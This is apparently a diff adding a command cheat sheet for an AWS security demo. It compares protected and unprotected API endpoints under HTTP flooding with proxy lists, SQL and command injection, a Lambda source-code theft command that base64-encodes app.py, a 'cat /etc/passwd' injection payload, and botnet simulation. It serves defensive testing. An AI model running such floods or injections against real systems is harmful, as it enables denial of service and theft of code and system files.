@@ -1,0 +1,63 @@
+HTTP flooding
+
+Unprotected
+python http_flood.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 5000 --concurrent 100
+
+python http_flood.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 5000 --concurrent 50 --burst-size 100 --burst-delay 0
+
+python cc.py -url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews -m post -v 5 -f proxy2.txt -t 100 -s 30
+
+Protected
+python http_flood.py --url https://vpra7ju8ka.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 5000 --concurrent 100
+
+python http_flood.py --url https://vpra7ju8ka.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 5000 --concurrent 50 --burst-size 100 --burst-delay 0
+
+
+python cc.py -url https://dii8zm6k8ebx4.cloudfront.net -m post -v 5 -f proxy2.txt -t 100 -s 120
+python cc.py -url https://dii8zm6k8ebx4.cloudfront.net -f proxy2.txt -t 3000
+
+Legitimate User to Protected
+python http_legitimate.py --url https://vpra7ju8ka.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 100 --concurrent 2 --burst-size 1 --burst-delay 30
+
+Legitimate User to unprotected
+python http_legitimate.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --requests 100 --concurrent 2 --burst-size 1 --burst-delay 30
+
+
+Code Injection
+# For SQL injection attack
+python code_injection.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --type sql --attempts 5
+
+# For command injection attack
+python code_injection.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --type cmd --attempts 5
+
+# For Lambda code theft attack
+python lambda_code_theft.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --command "cd /var; cd task; f=\$(head -50 app.py|base64 --wrap=0); echo \$f"
+python lambda_code_theft.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --command 'cd /var; cd task; f=$(head -50 app.py|base64 --wrap=0); echo $f'
+
+python lambda_code_theft.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --command 'cd /var; cd task; f=$(head -50 app.py|base64 --wrap=0); echo $f'
+python lambda_code_theft.py --url https://ej8w9qp45k.execute-api.us-east-1.amazonaws.com/demo/reviews --command 'echo test'
+
+
+Go directly to the application level and put input as per below
+      "product_id": "exploit_1234; cat /etc/passwd",
+      "review": "test",
+      "username": "test_user"
+
+Open the developer tool to verify the attack successful
+
+
+Bot simulate
+# Simulate botnet attack on unprotected API
+python attack/bot_simulator.py --mode botnet --bot-types simple rotating flood --bot-requests 50 --duration 30
+
+# Simulate botnet attack on protected API
+python attack/bot_simulator.py --mode botnet --protected --bot-types simple rotating flood --bot-requests 50 --duration 30
+
+# Simulate human traffic on unprotected API
+python attack/bot_simulator.py --mode human --humans 5 --human-requests 10
+
+# Simulate mixed traffic (both bots and humans)
+python attack/bot_simulator.py --mode mixed --bot-types simple scraper --humans 3 --duration 60
+
+# Pure flood attack (most aggressive)
+python attack/bot_simulator.py --mode flood --bot-requests 100 --duration 20
